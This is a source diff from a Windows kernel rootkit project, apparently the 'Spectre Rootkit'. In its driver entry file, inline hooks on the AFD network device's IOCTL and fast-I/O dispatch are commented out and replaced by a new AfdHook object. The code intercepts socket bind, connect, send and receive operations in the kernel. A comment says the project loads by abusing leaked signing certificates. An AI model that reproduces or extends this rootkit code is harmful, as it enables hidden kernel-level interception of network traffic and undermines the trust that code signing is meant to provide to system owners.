@@ -5,9 +5,7 @@
  * COPYRIGHT Bill Demirkapi 2020
  */
 #include "common.h"	
-#include "FileObjHook.h"
-
-PFILE_OBJ_HOOK DeviceHook;
+#include "AfdHook.h"
 
 EXTERN_C_START
 
@@ -25,48 +23,48 @@ DriverEntry (
 //	);
 EXTERN_C_END
 
-NTSTATUS HookIoctl (
-	_In_ DRIVER_DISPATCH OriginalFunction,
-	_In_ struct _DEVICE_OBJECT* DeviceObject,
-	_Inout_ struct _IRP* Irp
-	)
-{
-	NTSTATUS status;
-	PIO_STACK_LOCATION irpStackLocation;
-
-	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);
-
-	if (irpStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL)
-	{
-		DBGPRINT("HookIoctl: IRP_MJ_DEVICE_CONTROL IOCTL(0x%X)", irpStackLocation->Parameters.DeviceIoControl.IoControlCode);
-		switch (irpStackLocation->Parameters.DeviceIoControl.IoControlCode)
-		{
-		case IOCTL_AFD_BIND:
-			DBGPRINT("HookIoctl: IOCTL_AFD_BIND.");
-			break;
-		case IOCTL_AFD_CONNECT:
-			DBGPRINT("HookIoctl: IOCTL_AFD_CONNECT.");
-			break;
-		case IOCTL_AFD_ACCEPT:
-			DBGPRINT("HookIoctl: IOCTL_AFD_ACCEPT.");
-			break;
-		case IOCTL_AFD_RECV:
-			DBGPRINT("HookIoctl: IOCTL_AFD_RECV.");
-			break;
-		case IOCTL_AFD_SEND:
-			DBGPRINT("HookIoctl: IOCTL_AFD_SEND.");
-			break;
-		}
-	}
-	else
-	{
-		DBGPRINT("HookIoctl: Major Function %i.", irpStackLocation->MajorFunction);
-	}
-
-	status = OriginalFunction(DeviceObject, Irp);
-
-	return status;
-}
+//NTSTATUS HookIoctl (
+//	_In_ DRIVER_DISPATCH OriginalFunction,
+//	_In_ struct _DEVICE_OBJECT* DeviceObject,
+//	_Inout_ struct _IRP* Irp
+//	)
+//{
+//	NTSTATUS status;
+//	PIO_STACK_LOCATION irpStackLocation;
+//
+//	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);
+//
+//	if (irpStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL)
+//	{
+//		DBGPRINT("HookIoctl: IRP_MJ_DEVICE_CONTROL IOCTL(0x%X)", irpStackLocation->Parameters.DeviceIoControl.IoControlCode);
+//		switch (irpStackLocation->Parameters.DeviceIoControl.IoControlCode)
+//		{
+//		case IOCTL_AFD_BIND:
+//			DBGPRINT("HookIoctl: IOCTL_AFD_BIND.");
+//			break;
+//		case IOCTL_AFD_CONNECT:
+//			DBGPRINT("HookIoctl: IOCTL_AFD_CONNECT.");
+//			break;
+//		case IOCTL_AFD_ACCEPT:
+//			DBGPRINT("HookIoctl: IOCTL_AFD_ACCEPT.");
+//			break;
+//		case IOCTL_AFD_RECV:
+//			DBGPRINT("HookIoctl: IOCTL_AFD_RECV.");
+//			break;
+//		case IOCTL_AFD_SEND:
+//			DBGPRINT("HookIoctl: IOCTL_AFD_SEND.");
+//			break;
+//		}
+//	}
+//	else
+//	{
+//		DBGPRINT("HookIoctl: Major Function %i.", irpStackLocation->MajorFunction);
+//	}
+//
+//	status = OriginalFunction(DeviceObject, Irp);
+//
+//	return status;
+//}
 
 //
 //VOID
@@ -78,40 +76,82 @@ NTSTATUS HookIoctl (
 //	ExFreePoolWithTag(DeviceHook, 'hFpS');
 //}
 
-BOOLEAN HookFastIoctl (
-	_In_ PFILE_OBJECT FileObject,
-	_In_ BOOLEAN Wait,
-	_In_ PVOID InputBuffer,
-	_In_ ULONG InputBufferLength,
-	_Out_ PVOID OutputBuffer,
-	_In_ ULONG OutputBufferLength,
-	_In_ ULONG IoControlCode,
-	_Out_ PIO_STATUS_BLOCK IoStatus,
-	_In_ PDEVICE_OBJECT DeviceObject
-	)
-{
-	//DBGPRINT("HookFastIoctl: IRP_MJ_DEVICE_CONTROL IOCTL(0x%X)", IoControlCode);
-	switch (IoControlCode)
-	{
-	case IOCTL_AFD_BIND:
-		DBGPRINT("HookFastIoctl: IOCTL_AFD_BIND.");
-		break;
-	case IOCTL_AFD_CONNECT:
-		DBGPRINT("HookFastIoctl: IOCTL_AFD_CONNECT.");
-		break;
-	case IOCTL_AFD_ACCEPT:
-		DBGPRINT("HookFastIoctl: IOCTL_AFD_ACCEPT.");
-		break;
-	case IOCTL_AFD_RECV:
-		DBGPRINT("HookFastIoctl: IOCTL_AFD_RECV.");
-		break;
-	case IOCTL_AFD_SEND:
-		//DBGPRINT("HookFastIoctl: IOCTL_AFD_SEND.");
-		break;
-	}
+//BOOLEAN HookFastIoctl (
+//	_In_ PFILE_OBJECT FileObject,
+//	_In_ BOOLEAN Wait,
+//	_In_ PVOID InputBuffer,
+//	_In_ ULONG InputBufferLength,
+//	_Out_ PVOID OutputBuffer,
+//	_In_ ULONG OutputBufferLength,
+//	_In_ ULONG IoControlCode,
+//	_Out_ PIO_STATUS_BLOCK IoStatus,
+//	_In_ PDEVICE_OBJECT DeviceObject
+//	)
+//{
+//	UNREFERENCED_PARAMETER(FileObject);
+//	UNREFERENCED_PARAMETER(Wait);
+//	UNREFERENCED_PARAMETER(InputBuffer);
+//	UNREFERENCED_PARAMETER(InputBufferLength);
+//	UNREFERENCED_PARAMETER(OutputBuffer);
+//	UNREFERENCED_PARAMETER(OutputBufferLength);
+//	UNREFERENCED_PARAMETER(IoControlCode);
+//	UNREFERENCED_PARAMETER(IoStatus);
+//	UNREFERENCED_PARAMETER(DeviceObject);
+//	return FALSE;
+//}
+//
+//BOOLEAN
+//HookFastRead (
+//	_In_ PFILE_OBJECT FileObject,
+//	_In_ PLARGE_INTEGER FileOffset,
+//	_In_ ULONG Length,
+//	_In_ BOOLEAN Wait,
+//	_In_ ULONG LockKey,
+//	_Out_ PVOID Buffer,
+//	_Out_ PIO_STATUS_BLOCK IoStatus,
+//	_In_ PDEVICE_OBJECT DeviceObject
+//	)
+//{
+//	UNREFERENCED_PARAMETER(FileObject);
+//	UNREFERENCED_PARAMETER(FileOffset);
+//	UNREFERENCED_PARAMETER(Length);
+//	UNREFERENCED_PARAMETER(Wait);
+//	UNREFERENCED_PARAMETER(LockKey);
+//	UNREFERENCED_PARAMETER(Buffer);
+//	UNREFERENCED_PARAMETER(IoStatus);
+//	UNREFERENCED_PARAMETER(DeviceObject);
+//	return FALSE;
+//}
+//
+//BOOLEAN
+//HookFastWrite ( 
+//	_In_ PFILE_OBJECT FileObject,
+//	_In_ PLARGE_INTEGER FileOffset,
+//	_In_ ULONG Length,
+//	_In_ BOOLEAN Wait,
+//	_In_ ULONG LockKey,
+//	_In_ PVOID Buffer,
+//	_Out_ PIO_STATUS_BLOCK IoStatus,
+//	_In_ PDEVICE_OBJECT DeviceObject
+//	)
+//{
+//	UNREFERENCED_PARAMETER(FileObject);
+//	UNREFERENCED_PARAMETER(FileOffset);
+//	UNREFERENCED_PARAMETER(Length);
+//	UNREFERENCED_PARAMETER(Wait);
+//	UNREFERENCED_PARAMETER(LockKey);
+//	UNREFERENCED_PARAMETER(Buffer);
+//	UNREFERENCED_PARAMETER(IoStatus);
+//	UNREFERENCED_PARAMETER(DeviceObject);
+//	return FALSE;
+//}
 
-	return FileObjHook::OriginalFastIo.FastIoDeviceControl(FileObject, Wait, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, IoControlCode, IoStatus, DeviceObject);
-}
+#define AFD_HOOK_TAG 'hApS'
+
+//
+// Manages the hook on \Device\Afd.
+//
+PAFD_HOOK AfdDeviceHook;
 
 /**
 	Initialize the Spectre Rootkit.
@@ -125,8 +165,6 @@ DriverEntry (
 	_In_ PUNICODE_STRING RegistryPath
 	)
 {
-	FAST_IO_DISPATCH fastIoHooks;
-
 	//
 	// We don't know if these parameters are valid.
 	// Although this project abuses leaked certificates by default,
@@ -137,10 +175,6 @@ DriverEntry (
 	UNREFERENCED_PARAMETER(DriverObject);
 	UNREFERENCED_PARAMETER(RegistryPath);
 
-	memset(&fastIoHooks, 0, sizeof(fastIoHooks));
-	fastIoHooks.SizeOfFastIoDispatch = sizeof(FAST_IO_DISPATCH);
-	fastIoHooks.FastIoDeviceControl = HookFastIoctl;
-
-	DeviceHook = new (NonPagedPool, 'hFpS') FileObjHook(L"Afd", DirectHook, HookIoctl, &fastIoHooks);
+	AfdDeviceHook = new (NonPagedPool, AFD_HOOK_TAG) AfdHook();
 	return STATUS_SUCCESS;
 }
